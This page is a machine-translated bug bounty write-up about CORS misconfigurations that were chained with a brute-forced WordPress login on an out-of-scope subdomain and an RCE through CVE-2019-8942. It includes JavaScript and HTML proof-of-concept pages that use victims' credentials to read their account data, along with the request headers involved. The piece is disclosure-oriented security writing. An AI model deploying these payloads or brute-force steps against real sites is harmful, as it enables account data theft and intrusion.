<html>
<head>
<title>Broke limited scope with a chain of bugs (tips for every rider CORS)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">用一连串的错误打破了有限的范围(给每个骑手的提示CORS)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/broke-limited-scope-with-a-chain-of-bugs-ef734ac430f5?source=collection_archive---------0-----------------------#2020-03-09">https://infosecwriteups.com/broke-limited-scope-with-a-chain-of-bugs-ef734ac430f5?source=collection_archive---------0-----------------------#2020-03-09</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/e1ad3522e404c4f71c99d717ae119979.png" data-original-src="https://miro.medium.com/v2/resize:fit:724/format:webp/1*_rFsG6NMpyXMvOWmDLu4vg.jpeg"/></div></figure><p id="eea6" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">一天早上，我被邀请参加一个私人的臭虫奖励计划。总的来说，我在安全方面的经验都是基于这样的私人项目。这在一方面是好的，因为几乎没有人急于在其他人之前找到最危险的bug。另一方面，这是一个糟糕的增长点。增长点肯定是有的，但是这种情况下的增速还是挺慢的。给我写信的人要了一个链接，指向我的<a class="ae kv" href="https://hackerone.com/krevetk0" rel="noopener ugc nofollow" target="_blank"> HackerOne账户</a>。我分享了我个人资料的链接。但是我有点尴尬。那时我个人资料是零信誉(5个月前)。其实不是。这有点消极，因为我曾经试图联系该公司，通知他们“功能损坏”，但当时我找不到比HackerOne更好的连接。我报告了一个问题。但是我得到了一个负面的信誉分数，仅仅因为这个问题与安全领域无关。而且从那以后我就没用过这个账号了。在那个时候，我决定用一切手段来解决这个问题。</p><p id="471b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">它决定尝试在几个节目中为自己平反。两个程序都是私有的。但这并没有简化情况，因为在我之前，在信息安全领域有名气的人已经在那里发现了很多漏洞。</p><p id="40db" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在第一个程序中，我有一个有限的范围等待着我(这是当只有某些领域和子域被允许测试)。</p><figure class="kx ky kz la gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="lb lc di ld bf le"><div class="gh gi kw"><img src="../Images/1ebdca0b341bf4b2e50156dd2f69a952.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PgybOlVgPWn8LV11OymupQ.png"/></div></div></figure><p id="91aa" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这种顺序总是让我有点吃惊。如果你的公司被发现通过主范围之外的子域泄露数据，你仍然不能逃脱GDPR或CCPA的罚款。当然，这都是来自经济领域。但在我看来，限制范围就是制造额外的风险。</p><p id="0e4d" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我开始在一个主要领域寻找漏洞的冒险时，我想到了一个有趣的惊喜。在向服务器发出几次请求后，我发现一个配置非常奇怪的CORS策略。</p><p id="ae69" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">关于起源:attacker.companyname.com请求。<br/>我得到了答案*.companyname.com和额外的头Access-Control-Allow-Credentials:true</p><figure class="kx ky kz la gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="lb lc di ld bf le"><div class="gh gi lf"><img src="../Images/b3ea6b581f89a1942c6c6f9814a807a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H5O_0ZJj-hZnIoVR9CMp6A.png"/></div></div></figure><p id="9d52" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在我的例子中，有子域通配符。考虑到子域不是漏洞搜索程序的一部分，这是不是有点奇怪？在这种情况下，我决定向公司证明该计划的局限性有点奇怪。所以我开始搜索能够让我执行黑客攻击(攻击场景)的子域。</p><p id="0f35" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">从攻击者的角度来看，我的CORS配置可能是危险的，如果我找到一种方法来进行子域接管或通过XSS向量实施攻击。</p><p id="1abb" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">试图找到一个子域接管有效的错误失败了，我决定挖掘任何子域上的XSS。我的注意力被一个WordPress网站列表吸引住了。大多数都被遗弃了。最后一篇文章是几年前写的。很明显，各版本都存在所有最新的严重漏洞。我试图利用其中的一些，但这些尝试都不成功。大多数人认为WordPress至少有最低限度的用户权限。在这一点上，我想向NordVPN项目的所有者问好，他们接受来自<a class="ae kv" href="https://hackerone.com/reports/752073" rel="noopener ugc nofollow" target="_blank">扫描仪的<a class="ae kv" href="https://hackerone.com/reports/751876" rel="noopener ugc nofollow" target="_blank">报告</a>，而没有真实的剥削例子</a>。🤦</p><p id="98de" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">然后，我决定通过XML-RPC强行获取凭证。对了，可用的XML-RPC也是被低估的漏洞之一。</p><p id="3460" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">几分钟后，我用用户名和密码为我的攻击收集了一个简单的字典。确定用户并不困难。这本词典包含关键词——公司名称、城市、公司成立年份等等。几分钟后，我进入了一个WordPress，出于某种原因，那里有一个密码为“公司名称”的用户。而用户本人，从Linkedin来看，并没有在这家公司工作很长时间。</p><figure class="kx ky kz la gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="lb lc di ld bf le"><div class="gh gi lg"><img src="../Images/2073b7539f0cad9b89ac275c652912ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rB5YzF58Pfc8BzTHAfUkxQ.png"/></div></div></figure><p id="9179" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">主域上可供利用的漏洞链开始慢慢发展。接下来的几天，我继续慢慢琢磨这是什么版本的引擎。用什么样的主题。安装了什么样的插件？但是在我研究的第一天，我做了一件重要的事情。我通过创建一个新的空白出版物来跟踪网站上可能的活动，从而嵌入了跟踪像素(<a class="ae kv" href="https://iplogger.ru/" rel="noopener ugc nofollow" target="_blank"> IP logger </a>)。这对我帮助很大！！！</p><p id="8b2a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">以下代码用于攻击主域。</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="0d94" class="lm ln it li b gy lo lp l lq lr">&lt;script&gt;<br/>function cors() {  <br/>var xhttp = new XMLHttpRequest();  <br/>xhttp.onreadystatechange = function() {    <br/>    if (this.status == 200) {    <br/>    console.log('Ololo &gt;&gt;&gt;', this.responseText);         <br/>    }  <br/>};  <br/>xhttp.open("GET", "https://www.example.com/v/account/welcome/show", true);  <br/>xhttp.withCredentials = true;  <br/>xhttp.send();<br/>}<br/>cors();<br/>&lt;/script&gt;</span></pre><p id="a70b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我把它放在一个有编辑权限的受控WordPress站点的主页上。事实上，这是我针对用户的展示攻击场景的最终计划。用户只需打开我的mywordpress.example.com，他的所有重要数据都可能被攻击者捕获。这意味着他从主域的活动登录会话登录到了我的子域，能够读取用户的所有敏感信息。</p><p id="6889" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">有了这些结果，你可以写一份报告，得到哈克龙的声誉积分，甚至一些钱。但是我不能放弃这样的想法，即受控的Wordpress可能有其他的东西。在多花了一点时间后，我有了PoC，拥有用户权限的用户可以在服务器上执行命令(RCE)。在我的情况下，我使用的已知漏洞<a class="ae kv" href="https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-CVE-2019-8942" rel="noopener ugc nofollow" target="_blank">CVE-2019-8942</a>。</p><p id="335a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">最后，我能够通过一个松散配置的CORS策略构建一个攻击用户的漏洞链。另外，我能够在其中一个子域上制作一个RCE。我记录了两份不同的报告，然后开始等待。关于CORS的报道很快就被拆封了。他们能够足够快地复制它并开始修复它。但是关于RCE的报告开放了15天。但是在这里，跟踪像素IPLogger帮助了我。</p><figure class="kx ky kz la gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="lb lc di ld bf le"><div class="gh gi ls"><img src="../Images/0137c2ee74605c90fc2666204fa414ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-k0SdzT2ZFkriHCcRPxdXA.png"/></div></div></figure><p id="12a3" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">几天后，我在捕获的Wordpress上发现了一些活动。又过了一天，网站不可用。关于CORS的主要报告被标记为固定和封闭的，但是WordPress子域名上的RCE仍然开放。这让我非常生气，我通过沟通渠道来解决问题。在我的电子邮件中，我提供了公司员工如何进入被捕获的网站、在那里执行一些操作并最终关闭网站的事实。第二天，我没有收到该公司的任何回复，但我收到了哈克龙的两封电子邮件，通知我两份报告都已关闭，而且都已付款。当然，我很高兴看到这种情况继续下去。毕竟，我的主要目标是获得一些声誉分数，每个人都很喜欢看这些分数。</p><p id="bf30" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">同样在现实生活中，我遇到了CORS的误解，即在没有右侧限制和参考者检查的情况下，域中存在信任。<br/>这个问题是在另一个私人程序中发现的。为了遵守隐私政策，我们把这个网站命名为<strong class="jz iu">trustcasino.com</strong>。<br/>在与该站点交互过程中，检测到以下情况—如果我们发送了带有以下标题的请求:</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="fbff" class="lm ln it li b gy lo lp l lq lr">Origin: https://www.trustcasino.com.anydomain.com<br/>Referer: https://anydomain.com</span></pre><p id="b3f8" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">回应是</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="44ab" class="lm ln it li b gy lo lp l lq lr">Access-Control-Allow-Credentials: true<br/>Access-Control-Allow-Origin: https://www.trustcasino.com.anydomain.com<br/>Access-Control-Allow-Methods: POST, GET</span></pre><p id="8c01" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">由于CORS政策中的此类错误，有可能从trustcasino.com的授权用户处接收数据。<br/>您需要做的就是创建以下地址<a class="ae kv" href="https://www.trustcasino.com.anydomain.com/pidor.html" rel="noopener ugc nofollow" target="_blank">https://www.trustcasino.com.anydomain.com/pidor.html</a>并吸引用户。pidor.html文件本身应该包含以下代码。</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="979e" class="lm ln it li b gy lo lp l lq lr">&lt;html&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;script&gt;<br/>      function submitRequest()<br/>      {<br/>        var xhr = new XMLHttpRequest();<br/>        xhr.open("GET", "https:\/\/www.trustcasino.com\/myaccount\/deposit.json", true);<br/>        xhr.withCredentials = true;<br/>        var body = "";<br/>        var aBody = new Uint8Array(body.length);<br/>        for (var i = 0; i &lt; aBody.length; i++)<br/>          aBody[i] = body.charCodeAt(i);<br/>    xhr.onreadystatechange = function() {<br/>            if (xhr.readyState === 4) {<br/>            alert(xhr.response);<br/>            }<br/>    } <br/>        xhr.send(new Blob([aBody]));<br/>      }<br/>    &lt;/script&gt;<br/>    &lt;form action="#"&gt;<br/>      &lt;input type="button" value="Submit request" onclick="submitRequest();" /&gt;<br/>    &lt;/form&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="7210" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当用户点击攻击者的页面(trust casino . com . any domain . com/pidor . html)时，有关trustcasino.com用户帐户的所有信息都会传输到攻击者域。</p><p id="8d06" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">有这样的请求还有另一个CORS配置错误:</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="af55" class="lm ln it li b gy lo lp l lq lr">GET /alltransactions<br/>Host: docs.bigbank.com<br/>Origin: null</span></pre><p id="3e83" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们将收到:</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="277f" class="lm ln it li b gy lo lp l lq lr">HTTP/1.1 200 OK<br/>Acess-Control-Allow-Origin: null<br/>Access-Control-Allow-Credentials: true</span></pre><p id="406a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">据我所知，这种攻击的概念验证应该是这样的:</p><pre class="kx ky kz la gt lh li lj lk aw ll bi"><span id="8b17" class="lm ln it li b gy lo lp l lq lr">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" <br/>src='data:text/html,&lt;script&gt;*cors stuff here*&lt;/script&gt;’&gt;<br/>&lt;/iframe&gt;</span></pre><p id="f836" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">总之，在CORS的配置策略中，有一些东西可以帮助攻击者:子域通配符，前域通配符，后域通配符，空起源。</p><p id="94e4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">PS:点击👏“拍手”图标，如果你喜欢这篇文章😉</p><h1 id="965d" class="lt ln it bd lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp bi translated">参考</h1><p id="75cf" class="pw-post-body-paragraph jx jy it jz b ka mq kc kd ke mr kg kh ki ms kk kl km mt ko kp kq mu ks kt ku im bi translated"><a class="ae kv" href="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" rel="noopener ugc nofollow" target="_blank">https://www . we45 . com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-CORS</a><br/>T3】https://ports wigger . net/blog/exploining-CORS-misconfiguration-for-bit coins-and-boundants<br/><a class="ae kv" href="https://habr.com/ru/company/pentestit/blog/337146/" rel="noopener ugc nofollow" target="_blank">https://habr.com/ru/company/pentestit/blog/337146/</a><br/><a class="ae kv" href="https://medium.com/pareture/simple-local-cors-test-tool-544f108311c5" rel="noopener">https://medium . com/pare ture/simple-local-CORS-test-tool-544 f 108311 C5</a></p></div><div class="ab cl mv mw hx mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="im in io ip iq"><p id="724a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><em class="nc">关注</em> <a class="ae kv" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nc"> Infosec报道</em> </a> <em class="nc">获取更多此类精彩报道。</em></p><div class="nd ne gp gr nf ng"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nh ab fo"><div class="ni ab nj cl cj nk"><h2 class="bd iu gy z fp nl fr fs nm fu fw is bi translated">信息安全报道</h2><div class="nn l"><h3 class="bd b gy z fp nl fr fs nm fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="no l"><p class="bd b dl z fp nl fr fs nm fu fw dk translated">medium.com</p></div></div><div class="np l"><div class="nq l nr ns nt np nu jv ng"/></div></div></a></div></div></div>    
</body>
</html>